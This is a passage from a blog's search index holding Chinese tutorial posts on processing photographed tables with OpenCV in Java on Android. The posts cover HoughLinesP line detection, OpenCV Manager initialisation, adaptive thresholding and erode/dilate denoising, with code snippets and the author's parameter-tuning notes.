<p>如果不能理解也没有关系，在<code>openCV</code>中已经为我们封装成了两个函数<code>HoughLines( )</code>与<code>HoughLinesP( )</code>，他们之间的区别在于算法的不同，而效果的差别不大，但<code>HoughLinesP</code>可以减少计算量，所以在这里我们采用了<code>HoughLinesP</code>来进行。<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">HoughLinesP</span><span class="params">(Mat image,Mat lines,<span class="keyword">double</span> rho,<span class="keyword">double</span> theta,<span class="keyword">int</span> threshold,<span class="keyword">double</span> minLineLength,<span class="keyword">double</span> maxLineGap)</span></span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>Finds line segments in a binary image using the probabilistic Hough transform.</p>
</blockquote>
<blockquote>
<p>Parameters:<br><code>image</code> - 8-bit, single-channel binary source image. The image may be modified by the function.<br><code>lines</code> - Output vector of lines. Each line is represented by a 4-element vector (x_1, y_1, x_2, y_2), where (x_1,y_1) and (x_2, y_2) are the ending points of each detected line segment.<br><code>rho</code> - Distance resolution of the accumulator in pixels.<br><code>theta</code> - Angle resolution of the accumulator in radians.<br><code>threshold</code> - Accumulator threshold parameter. Only those lines are returned that get enough votes (&gt;threshold).<br><code>minLineLength</code> - Minimum line length. Line segments shorter than that are rejected.<br><code>maxLineGap</code> - Maximum allowed gap between points on the same line to link them.</p>
</blockquote>
<p>解释一下各个参数：</p>
<ul>
<li><p><code>image</code>:源图像 Mat格式，8位单通道（<code>Cv_8UC1</code>）</p>
</li>
<li><p><code>lines</code>: 输出的“图像” 虽然是Mat格式，但是其中保存的内容已经不再是图像了，其中的每行（<code>Rows</code>！在这里手上买到的一本书中写成了列，大概是因为版本不同导致的，因为这个在这里卡了好几个小时……）中储存了一个<code>double[]</code>，下面会讲到如何使用里面的信息。</p>
</li>
<li><p><code>rho</code>：翻译过来是距离的解析度，以像素为单位，在后面这个参数起了大作用。</p>
</li>
<li><p><code>theta</code>：与rho相似地，是角度的解析度，以弧度为单位。</p>
</li>
<li><p><code>threshold</code>：阈值 这个值决定了霍夫变换后对于一对值投票所需达到的阈值才能被记录。换句话说，这个值越大，检测出直线的要求就越高（这个要求应该是对于直线上的点聚集程度的要求）。应为一个非负值。</p>
</li>
<li><p><code>minLineLength</code>:字面意思，检测出的直线的最小长度，小于这个长度的直线将不会被记录。单位是像素。</p>
</li>
<li><p><code>maxLineGap</code>：字面意思，检测时可以接受的直线断开的距离（实际情况中很难达到一条直线上的点全部都有，通常是断断续续的，这时这个值就发挥了很大的作用）。单位是像素。</p>
</li>
</ul>
<p>可以看到这个函数的参数非常多，并且有个别参数并没有一个量化的标准（比如<code>threshold</code>在检测大图的时候取150左右的值比较好，但在后面检测小图时候设成0都不尽人意，<code>rho</code>与<code>theta</code>参数如果按照资料中普遍的1和2pi/180来设置小图的检测就会出现问题），更加悲惨的是这些参数之间存在相互影响，对实际的图片进行处理的过程中参数的差别可能很大，需要一些耐心和方法去慢慢调试（我写了嵌套的循环再输出所有的图用肉眼看效果再缩小范围……）</p>
<p>最影响最终效果的部分在于最后两个值的设置，可以看到上面我们将要处理的图片，这步我的目的是检测出所有的横向的表格边线。下面先上最终的效果图：</p>
<p><img src="/images/redLines1.jpg" alt="redlines1"></p>
<p>(红线为最终检测出的直线位置）</p>
<p>具体的检测过程下一篇介绍。</p>
]]></content>
      <categories>
        <category>Java</category>
        <category>OpenCV</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>OpenCV</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenCV处理拍照表格（一）</title>
    <url>/2016/11/15/OpenCV%E5%A4%84%E7%90%86%E6%8B%8D%E7%85%A7%E8%A1%A8%E6%A0%BC%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p><a href="https://www.learn2crack.com/2016/03/setup-opencv-sdk-android-studio.html" target="_blank" rel="noopener">https://www.learn2crack.com/2016/03/setup-opencv-sdk-android-studio.html</a></p>
<p>非常新的一篇在AS中安装<code>OpenCV</code>的教程，按教程装好了环境并测试通过。</p>
<p>注意教程中没有讲到的是想要使用<code>OpenCV</code>的相关功能，需要安装下载包中apk目录下的对应处理器的<code>OpenCV manager</code>。并在使用<code>OpenCV</code>的活动中加入以下内容：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> BaseLoaderCallback mLoaderCallback = <span class="keyword">new</span> BaseLoaderCallback(<span class="keyword">this</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Connect to OpenCV manager service and initialize</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onManagerConnected</span><span class="params">(<span class="keyword">int</span> status)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (status)&#123;</span><br><span class="line">            <span class="keyword">case</span> BaseLoaderCallback.SUCCESS:</span><br><span class="line">                Log.i(TAG, <span class="string">"OpenCV Success"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">super</span>.onManagerConnected(status);</span><br><span class="line">                Log.i(TAG, <span class="string">"OpenCV Fail"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Initialize at every resume</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onResume</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.onResume();</span><br><span class="line">    OpenCVLoader.initAsync(OpenCVLoader.OPENCV_VERSION_3_1_0, getApplicationContext(), mLoaderCallback);</span><br><span class="line">    Log.d(TAG, <span class="string">"On Resume OK"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><a id="more"></a></p>
<blockquote>
<p><a href="http://docs.opencv.org/java/3.1.0/" target="_blank" rel="noopener">http://docs.opencv.org/java/3.1.0/</a>&gt;<br>opencv的官方文档。<br><strong>更正：上面的3.1版的文档并没有详细的方法解释！</strong></p>
</blockquote>
<p><strong>所以只能看</strong></p>
<p><strong><a href="http://docs.opencv.org/java/2.4.11/" target="_blank" rel="noopener">http://docs.opencv.org/java/2.4.11/</a></strong></p>
<p><strong>2.4.11的。</strong></p>
<h2 id="处理的大致思路"><a href="#处理的大致思路" class="headerlink" title="处理的大致思路"></a>处理的大致思路</h2><h3 id="目前想到的思路是："><a href="#目前想到的思路是：" class="headerlink" title="目前想到的思路是："></a>目前想到的思路是：</h3><ol>
<li>图像彩色转灰度</li>
<li>灰度图像设置阈值后二值化即变成完全黑白</li>
<li>去除多余的噪点</li>
<li>边缘识别</li>
<li>透视变形</li>
<li>矩形识别</li>
<li>分割识别出的矩形</li>
<li>OCR对矩形进行识别，读取数据。</li>
</ol>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><h3 id="灰度与二值化"><a href="#灰度与二值化" class="headerlink" title="灰度与二值化"></a>灰度与二值化</h3><p>开始采用OpenCV中<code>BitmapToMat</code>方法，将文件以<code>Bitmap</code>的形式读取，再转换为<code>Mat</code>格式再进行处理。</p>
<p>后面发现了OpenCV自带的<code>imread</code>方法，传入文件路径和<code>Mat</code>的格式后就可以方便地获得一个<code>Mat</code>对象。</p>
<p>另外如果在这里采用<code>Imgcodecs.CV_LOAD_IMAGE_GRAYSCALE</code>标签，就可以直接以灰度的形式读取图像，省去了颜色转化的步骤。并且这个<code>Mat</code>的格式就是下面一步二值化要求传入的<code>8UC1</code>（8位单通道）格式。</p>
<p>下面就是二值化步骤，<code>OpenCV</code>提供了两个函数，第一个是普通的<code>Threshold</code>函数：</p>
<blockquote>
<h4 id="threshold"><a href="#threshold" class="headerlink" title="threshold"></a>threshold</h4><p>public static double threshold(<a href="http://docs.opencv.org/java/2.4.11/org/opencv/core/Mat.html" target="_blank" rel="noopener">Mat</a> src,<br><a href="http://docs.opencv.org/java/2.4.11/org/opencv/core/Mat.html" target="_blank" rel="noopener">Mat</a> dst,double thresh,double maxval,int type)<br>     Parameters:<br>     <code>src</code> - input array (single-channel, 8-bit or 32-bit floating point).<br>     <code>dst</code> - output array of the same size and type as <code>src</code>.<br>     <code>thresh</code> - threshold value.<br>     <code>maxval</code> - maximum value to use with the <code>THRESH_BINARY</code> and <code>THRESH_BINARY_INV</code> thresholding types.<br>     <code>type</code> - thresholding type (see the details below).</p>
</blockquote>
<p>传入图像，传出图像，阈值，填充的最深颜色，填充方法（达到阈值就填充最深颜色或相反），就可以根据每个像素的灰度值与阈值进行比较来决定填充的值为0或是最深。</p>
<p>定阈值的方法虽然可以对一张图像通过调整达到最优的效果，但是对于不同光照条件下拍摄出来的照片，因为整体亮度的不同，定阈值显然无法适应所有的情况。</p>
<p>所以就有了第二种函数，<code>adaptiveThreshold</code>，除了传入上面的这些参数外，增加了三个重要的参数</p>
<blockquote>
<h4 id="adaptiveThreshold"><a href="#adaptiveThreshold" class="headerlink" title="adaptiveThreshold"></a>adaptiveThreshold</h4><p>public static void adaptiveThreshold(<a href="http://docs.opencv.org/java/2.4.11/org/opencv/core/Mat.html" target="_blank" rel="noopener" title="class in org.opencv.core">Mat</a> src,<a href="http://docs.opencv.org/java/2.4.11/org/opencv/core/Mat.html" target="_blank" rel="noopener" title="class in org.opencv.core">Mat</a> dst,double maxValue,int adaptiveMethod,int thresholdType,int blockSize,double C)<br>Parameters:<br><code>src</code> - Source 8-bit single-channel image.<br><code>dst</code> - Destination image of the same size and the same type as <code>src</code>.<br><code>maxValue</code> - Non-zero value assigned to the pixels for which the condition is satisfied. See the details below.<br><code>adaptiveMethod</code> - Adaptive thresholding algorithm to use, <code>ADAPTIVE_THRESH_MEAN_C</code> or <code>ADAPTIVE_THRESH_GAUSSIAN_C</code>. See the details below.<br><code>thresholdType</code> - Thresholding type that must be either <code>THRESH_BINARY</code> or <code>THRESH_BINARY_INV</code>.<br><code>blockSize</code> - Size of a pixel neighborhood that is used to calculate a threshold value for the pixel: 3, 5, 7, and so on.<br><code>C</code> - Constant subtracted from the mean or weighted mean (see the details below). Normally, it is positive but may be zero or negative as well.</p>
</blockquote>
<p><code>blockSize</code>：对某个像素周围进行采样的范围。<br><code>adaptiveMethod</code>：根据上面的范围求阈值的方法，有两种：</p>
<ol>
<li>mean平均，简单地取采样范围内的平均值作为阈值。</li>
<li>gaussian高斯，以高斯函数为基础，简单地说就是近的地方权重更高、远的地方权重低，来求阈值。</li>
</ol>
<p><code>C</code>：求出来的阈值减去的常量。</p>
<p>这三个参数就是决定二值化效果的关键，我找最优值的方法比较暴力，写了一个嵌套的循环设置这两个值，再输出到文件导出到电脑上用肉眼比较。最后确定的值为17-10。</p>
<p><code>adaptiveMethod</code>我用的是<code>mean</code>，因为表格相对来说黑白比较明显，并不需要去根据距离的远近来决定阈值。</p>
<p>17这个值在我的手机拍摄出来的效果里面是最好的，但由于不同拍摄设备的分辨率不同，就造成了笔画所占据的像素的数量的不同，可以想到的是在高分辨率的情况下这个值应该要相应地增大，打个比方说我一个笔画的粗细就有17个像素，那么这个范围内检测出的阈值就会非常高从而导致笔画的残缺不全。</p>
<p><code>C</code>这个值还是需要经过测试来得出的，设置的不同对最后效果的影响是最大的，直接会决定最后出来的图片是笔画过粗或是笔画残缺。</p>
<p>下面是处理前后的效果：</p>
<p><img src="/images/QQ截图20161115205902-300x179.png" alt="qq%e6%88%aa%e5%9b%be20161115205902"><img src="/images/QQ截图20161115205922-300x188.png" alt="qq%e6%88%aa%e5%9b%be20161115205922"></p>
<p>可以看到二值化以后的图像只有黑白两色，但是明显有许多的噪点。</p>
<h3 id="去噪"><a href="#去噪" class="headerlink" title="去噪"></a>去噪</h3><p>二值化之后就是去噪了，去噪的目的是把图像中的独立的点去掉。</p>
<p>去噪的方法是腐蚀，跟字面意思一样，就是缩小图案的范围，当图像的范围本身就很小时（噪点就是一个个这样的独立点），缩小后自然就不见了。</p>
<p>可以想到，在去噪后，部分笔画也随之缩小甚至细的地方会直接消失，所以腐蚀之后要再进行一步膨胀，即把图案的边缘扩大。</p>
<p>因为噪点已经消失，所以也不会因扩大而回来，但笔画依然存在，就会膨胀而得到弥补，也顺便可以补一下残缺的地方。</p>
<p>原理大概就是这样，<strong>但是由于OpenCV的这两个操作针对的是图像中的亮点（白色的地方被认为是亮点），而我们的表格又是白底黑字的，实际上黑色的部分是我们想要处理的部分，所以我将这两步交换了，相当于是对黑色的地方先腐蚀后膨胀。</strong></p>
<p>下面是代码实现：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Mat kernelDilate = Imgproc.getStructuringElement(Imgproc.MORPH_DILATE, <span class="keyword">new</span> Size(<span class="number">2</span>, <span class="number">2</span>));</span><br><span class="line">Imgproc.dilate(srcPic, srcPic, kernelDilate);</span><br><span class="line">Imgcodecs.imwrite(<span class="string">"/storage/sdcard/pic/test/afterErode.jpg"</span>, srcPic);</span><br><span class="line">Mat kernelErode = Imgproc.getStructuringElement(Imgproc.MORPH_ERODE, <span class="keyword">new</span> Size(<span class="number">2</span>, <span class="number">2</span>));</span><br><span class="line">Imgproc.erode(srcPic, srcPic, kernelErode);</span><br><span class="line">Imgcodecs.imwrite(<span class="string">"/storage/sdcard/pic/test/afterDilate.jpg"</span>, srcPic);</span><br></pre></td></tr></table></figure><br>参数中有一个<code>Kernel</code>，这个就是处理图像的核，具体的内容不展开，我们利用<code>getStructuringElement</code>函数可以构建特定的处理核，这个函数第一个参数是构建的核的类型，除了用于代码中用到的膨胀和腐蚀的类型，还有<code>ract</code>、<code>cross</code>、<code>ellipse</code>等不同的形状，后面的<code>size</code>就是我们设置的重点了，指的是核的大小，可以理解成检测的范围，对于大的噪点自然需要大的范围，但是也意味着笔画细节丢失也更加严重。对于膨胀操作，则可以理解成膨胀的像素数，这个数值越大，最后的结果中的笔画也就越粗。</p>
<p>下面是上述代码的结果对比：</p>
<p><img src="/images/QQ截图20161115205922-300x188.png" alt="qq%e6%88%aa%e5%9b%be20161115205922">之前</p>
<p><img src="/images/QQ截图20161115202014-300x207.png" alt="qq%e6%88%aa%e5%9b%be20161115202014"> <img src="/images/QQ截图20161115202029-300x212.png" alt="qq%e6%88%aa%e5%9b%be20161115202029"> <img src="/images/QQ截图20161115202050-300x205.png" alt="qq%e6%88%aa%e5%9b%be20161115202050"> <img src="/images/QQ截图20161115202107-300x196.png" alt="qq%e6%88%aa%e5%9b%be20161115202107"></p>
<p>设置了四种不同的参数，可以看到噪点基本都被去除，最后的细节不尽相同。</p>
]]></content>
      <categories>
        <category>Java</category>
        <category>OpenCV</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>OpenCV</tag>
      </tags>
  </entry>
</search>
